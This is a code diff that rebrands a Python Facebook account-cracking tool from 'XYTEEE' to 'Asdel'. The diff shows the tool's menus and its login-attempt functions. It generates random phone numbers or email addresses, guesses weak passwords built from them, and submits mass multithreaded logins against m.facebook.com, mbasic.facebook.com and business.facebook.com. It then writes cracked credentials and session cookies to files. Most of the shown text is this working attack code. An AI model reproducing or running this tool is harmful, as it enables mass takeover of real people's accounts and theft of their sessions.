@@ -480,7 +480,7 @@ mtd,cp_xdx,cokix=[],[],[]
 def clear():
  os.system('clear')
 #---------------------[Banner]---------------------#
-def xyteee():
+def Asdel():
     #os.system('clear')
     print(f"""\x1b[1;97m
 
@@ -491,13 +491,13 @@ def xyteee():
  \x1b[0;91m•\x1b[0;97m▀▀ ▀▀  ▀ \x1b[0;91m•\x1b[0;97m  ▀▀▀  ▀▀▀  ▀▀▀  ▀▀▀ \033[1;31m\033[1;47mversion\033[0;0m\x1b[1;30m 1.1.1 \x1b[1;30m
 \033[38;3;276;131;0;1m-----------------------------------------------------
  Author   : XYTEEE-XD
- Telegram : t.me/xyteee
+ Telegram : t.me/Asdel
  Tools    : \x1b[38;5;208mXYTEEE-XC\x1b[1;97m
  Status   : \x1b[38;5;42mPremium\x1b[1;97m
 -----------------------------------------------------""")
 #---------------------[Main-Menu]---------------------#
 def rmain():
-    clear();xyteee()
+    clear();Asdel()
     print(" [1] crack from File")
     print(" [2] crack from number")
     print(" [3] crack from email")
@@ -516,14 +516,14 @@ def rmain():
     elif xytee in ["5","05"]:
      os.system("xdg-open https://wa.me/+8801926890544");rmain()
     elif xytee in ["0","00"]:
-     print(f' Exited Xyteee Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=61554748685443");time.sleep(3);os.system('xdg-open https://www.facebook.com/alphaxd.69');exit()
+     print(f' Exited Asdel Terminal ');os.system("xdg-open https://www.facebook.com/profile.php?id=61554748685443");time.sleep(3);os.system('xdg-open https://www.facebook.com/alphaxd.69');exit()
     else:
-     print(f" Don't Select Wrong Options ");os.system("xdg-open https://t.me/xyteeetools");rmain()
+     print(f" Don't Select Wrong Options ");os.system("xdg-open https://t.me/Asdeltools");rmain()
 
 #---------------------[File-Menu]---------------------#
 def file():
 	os.system('clear')
-	xyteee();print(' \033[1;37mExample \033[1;31m: \033[1;32m/sdcard/Xyteee.py');print(led)
+	Asdel();print(' \033[1;37mExample \033[1;31m: \033[1;32m/sdcard/Asdel.py');print(led)
 	o = input(' Put file path\033[1;31m :\x1b[1;90m ')
 	print('\x1b[1;97m')
 	try:lin = open(o).read().splitlines()
@@ -536,7 +536,7 @@ def file():
 	setting()
 #---------------------[File-Setting]---------------------#
 def setting():
-    clear();xyteee();print(f' [1] New Ids Crack ');print(f' [2] Old Ids Crack');print(f' [3] Mix Ids Crack');print(led)
+    clear();Asdel();print(f' [1] New Ids Crack ');print(f' [2] Old Ids Crack');print(f' [3] Mix Ids Crack');print(led)
     hu = input(f' Select Option {M}:{A} ')
     if hu in ['1','01']:
         for tua in sorted(id):
@@ -563,7 +563,7 @@ def setting():
     cokixx=input(f' Cloning Show Cookie ? y/n {M}:{A} ')
     if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
     else:cokix.append('n')
-    clear();xyteee();print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
+    clear();Asdel();print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
     hc = input(f' Select Method {M}:{A} ')
     if hc in ['1','01']:method.append('md1')
     elif hc in ['2','02']:method.append('md2')
@@ -572,7 +572,7 @@ def setting():
     clear();p4()
 #---------------------[File-Method]---------------------#
 def p4():
-    os.system("clear");xyteee();print(dt);print(f' Total Dump File -> {H}'+str(len(id)));print(f' \x1b[38;5;208mTurn on & off flight (airplane) mode before use\033[1;37m');print(led)
+    os.system("clear");Asdel();print(dt);print(f' Total Dump File -> {H}'+str(len(id)));print(f' \x1b[38;5;208mTurn on & off flight (airplane) mode before use\033[1;37m');print(led)
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -596,7 +596,7 @@ def p4():
 #---------------------[Random]---------------------#
 def rdm():
     os.system("clear")
-    xyteee()
+    Asdel()
     print(f"{P} [1] Random Cloning {M}({H}Fast{M})")
     print(f"{P} [2] Random Cloning {M}({H}Medium{M})")
     print(f"{P} [3] Random Cloning {M}({H}Slow{M})");print(led)
@@ -610,7 +610,7 @@ def rdm():
 #---------------------[Fast-Number]---------------------#
 def Fast():
   user=[]
-  os.system('clear');xyteee();print(dt);print(fast);print(led)
+  os.system('clear');Asdel();print(dt);print(fast);print(led)
   kode = input(f'{P} Select Code : ');print(led);print(limitt);print(led)
   limit = int(input(f' Crack Limit : '));print(led)
   xd_cp=input(f'{P} Cloning Show cp Account ? y/n {M}:{A} ')
@@ -620,7 +620,7 @@ def Fast():
   cokixx=input(f'{P} Cloning Show Cookie ? y/n {M}:{A} ')
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
-  clear();xyteee();print(dt) #;print(f" {P}Number : "+kode);print(led)
+  clear();Asdel();print(dt) #;print(f" {P}Number : "+kode);print(led)
   print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
   xc = input(f' Select Method {M}:{H} ')
   for nmbr in range(limit):
@@ -629,7 +629,7 @@ def Fast():
   with tred(max_workers=30) as xc_xytee:
     os.system('clear')
     tl = str(len(user))
-    xyteee();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
+    Asdel();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
     for guru in user:
       idf = kode+guru
       pwv=[idf,guru,guru[1:],idf[:6],idf[:7]]
@@ -643,7 +643,7 @@ def Fast():
 #---------------------[Medium-Number]---------------------#
 def Medium():
   user=[]
-  os.system('clear');xyteee();print(dt);print(medium);print(led)
+  os.system('clear');Asdel();print(dt);print(medium);print(led)
   kode = input(f'{P} Select Code {M}:{A} ');print(led);print(limitt);print(led)
   limit = int(input(f' Crack Limit {M}:{A} '));print(led)
   xd_cp=input(f'{P} Cloning Show cp Account ? y/n {M}:{A} ')
@@ -653,7 +653,7 @@ def Medium():
   cokixx=input(f'{P} Cloning Show Cookie ?? y/n {M}:{A} ')
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
-  clear();xyteee();print(dt);print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
+  clear();Asdel();print(dt);print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
   xc = input(f' Select Method {M}:{H} ')
   for nmbr in range(limit):
     nmp = ''.join(random.choice(string.digits) for _ in range(7))
@@ -661,7 +661,7 @@ def Medium():
   with tred(max_workers=30) as xc_xytee:
     os.system('clear')
     tl = str(len(user))
-    xyteee();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
+    Asdel();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
     for guru in user:
       idf = kode+guru
       pwv=[idf,guru,guru[1:],idf[:7],idf[:6],idf[:8]]
@@ -675,7 +675,7 @@ def Medium():
 #---------------------[Slow-Number]---------------------#
 def Slow():
   user=[]
-  os.system('clear');xyteee();print(dt);print(slow);print(led)
+  os.system('clear');Asdel();print(dt);print(slow);print(led)
   kode = input(f'{P} Select Code {M}:{A} ');print(led);print(limitt);print(led)
   limit = int(input(f' Crack Limit {M}:{A} '));print(led)
   xd_cp=input(f'{P} Cloning Show cp Account ? y/n {M}:{A} ')
@@ -685,7 +685,7 @@ def Slow():
   cokixx=input(f'{P} Cloning Show Cookie ?? y/n {M}:{A} ')
   if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
   else:cokix.append('n')
-  clear();xyteee();print(dt);print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
+  clear();Asdel();print(dt);print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
   xc = input(f'{P} Select Method {M}:{A} ')
   for nmbr in range(limit):
     koda = ''.join(random.choice(string.digits) for _ in range(2))
@@ -695,7 +695,7 @@ def Slow():
   with tred(max_workers=30) as xc_xytee:
     os.system('clear')
     tl = str(len(user))
-    xyteee();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
+    Asdel();print(dt);print(f'{P} Chose Number {K}>{H} {kode} {P}-{K}>{B}>{P} Total Number {B}>{M} {tl}{P}');print(led)
     for guru in user:
       idf = kode+koda+kodb+guru
       pwv = [koda+kodb+guru,koda+kodb+guru[1:],idf,kode+koda+kodb,kode+koda+kodb[1:]] #,'@#@#@#','bangladesh','free fire','i love you']
@@ -709,7 +709,7 @@ def Slow():
 #---------------------[Mail-1]---------------------#
 def mail():
     idf=[]
-    os.system('clear');xyteee();print(fst);print(led)
+    os.system('clear');Asdel();print(fst);print(led)
     first = input(f' First Name {M}: {H}');print(led);print(lst);print(led)
     last = input(f' Last Name {M}: {H}');print(led);print(limitt);print(led)
     limit = int(input(f' Crack Limit {M}: {H}'))
@@ -723,30 +723,30 @@ def mail():
     if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
     else:cokix.append('n')
     tkk = first+last
-    os.system("clear");xyteee();print(f" {P}Gmail Name : {tkk[:4]}****{domain}");print(led);print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
+    os.system("clear");Asdel();print(f" {P}Gmail Name : {tkk[:4]}****{domain}");print(led);print(f'{P} [1] Method async ≥ {H}m.facebook.com{P}');print(f' [2] Method validate ≥ {H}mbasic.facebook.com{P}');print(f' [3] Method regular ≥{H} business.facebook.com {P}');print(led)
     mthd = input(f' Select Method :{H} ')
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(3))
         idf.append(nmp)
-    with tred(max_workers=40) as xyteee_xd:
+    with tred(max_workers=40) as Asdel_xd:
         os.system('clear')
         idx = str(len(idf))
         tk = first+last
-        os.system("clear");xyteee();print(f'{P} Gmail Name : {tk[:4]}***{domain}');print(f' Total Ids : '+idx);print(led)
+        os.system("clear");Asdel();print(f'{P} Gmail Name : {tk[:4]}***{domain}');print(f' Total Ids : '+idx);print(led)
         for number in idf:
             idf = first+'.'+last+number+domain
             pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
-            if mthd in ['1','01']:xyteee_xd.submit(md1,idf,pwv)
-            elif mthd in ['2','02']:xyteee_xd.submit(md2,idf,pwv)
-            elif mthd in ['3','03']:xyteee_xd.submit(md3,idf,pwv)
+            if mthd in ['1','01']:Asdel_xd.submit(md1,idf,pwv)
+            elif mthd in ['2','02']:Asdel_xd.submit(md2,idf,pwv)
+            elif mthd in ['3','03']:Asdel_xd.submit(md3,idf,pwv)
             else:
-               xyteee_xd.submit(m5,idf,pwv)
+               Asdel_xd.submit(m5,idf,pwv)
     print('');print(f'{P} Crack process has been Successful')
     input(f' Press Enter To Go Menu');mail()
 #---------------------[Method-1]---------------------#
 def md1(idf,pwv):
   global loop,ok,cp
-  sys.stdout.write(f'\r{P} [Xyteee-M1] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
+  sys.stdout.write(f'\r{P} [Asdel-M1] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
   sys.stdout.flush()
   ua = random.choice(ugen)
   ses = requests.Session()
@@ -782,7 +782,7 @@ def md1(idf,pwv):
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
-         print(f'\r\x1b[38;5;208m [Xyteee-Cp] {idf}|{pw}{xxx}')
+         print(f'\r\x1b[38;5;208m [Asdel-Cp] {idf}|{pw}{xxx}')
         open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         cp+=1
         break
@@ -791,7 +791,7 @@ def md1(idf,pwv):
         coki=po.cookies.get_dict()
         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
         idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{H} [Xyteee-Ok] {idf}|{pw}{xxx}')
+        print(f'\r{H} [Asdel-Ok] {idf}|{pw}{xxx}')
         if 'y' in cokix:
          print(f'\r{B} Cookies {M}: {P}'+kuki)
         open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n');cek_apk(kuki)
@@ -804,7 +804,7 @@ def md1(idf,pwv):
 #---------------------[Method-2]---------------------#
 def md2(idf,pwv):
   global loop,ok,cp
-  sys.stdout.write(f'\r{P} [Xyteee-M2] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
+  sys.stdout.write(f'\r{P} [Asdel-M2] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),
   sys.stdout.flush()
   ua = random.choice(ugen)
   ses = requests.Session()
@@ -826,7 +826,7 @@ def md2(idf,pwv):
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
-         print(f'\r\x1b[38;5;208m [Xyteee-Cp] {idf}|{pw}{xxx}')
+         print(f'\r\x1b[38;5;208m [Asdel-Cp] {idf}|{pw}{xxx}')
         open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         cp+=1
         break
@@ -835,7 +835,7 @@ def md2(idf,pwv):
         coki=po.cookies.get_dict()
         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
         idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{H} [Xyteee-Ok] {idf}|{pw}{xxx}')
+        print(f'\r{H} [Asdel-Ok] {idf}|{pw}{xxx}')
         if 'y' in cokix:
          print(f'\r{B} Cookies {M}: {P}'+kuki)
         open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n');cek_apk(kuki)
@@ -848,7 +848,7 @@ def md2(idf,pwv):
 #---------------------[Method-3]---------------------#
 def md3(idf,pwv):
   global loop,ok,cp
-  sys.stdout.write(f'\r{P} [Xyteee-M3] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),sys.stdout.flush()
+  sys.stdout.write(f'\r{P} [Asdel-M3] %s|{H}OK{P}|{GREEN}%s'%(loop,ok)),sys.stdout.flush()
   ua, ua2 = Ugen(),Ugen2()
   ses = requests.Session()
   for pw in pwv:
@@ -865,7 +865,7 @@ def md3(idf,pwv):
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
-         print(f'\r\x1b[38;5;208m [Xyteee-Cp] \x1b[38;5;208m{idf}|{pw}{xxx}')
+         print(f'\r\x1b[38;5;208m [Asdel-Cp] \x1b[38;5;208m{idf}|{pw}{xxx}')
         open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         cp+=1
         break
@@ -874,7 +874,7 @@ def md3(idf,pwv):
         coki=po.cookies.get_dict()
         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
         idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{H} [Xyteee-Ok] {idf}|{pw}{xxx}')
+        print(f'\r{H} [Asdel-Ok] {idf}|{pw}{xxx}')
         if 'y' in cokix:
          print(f'\r{P} Cookies {M}:{P} '+kuki)
         open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
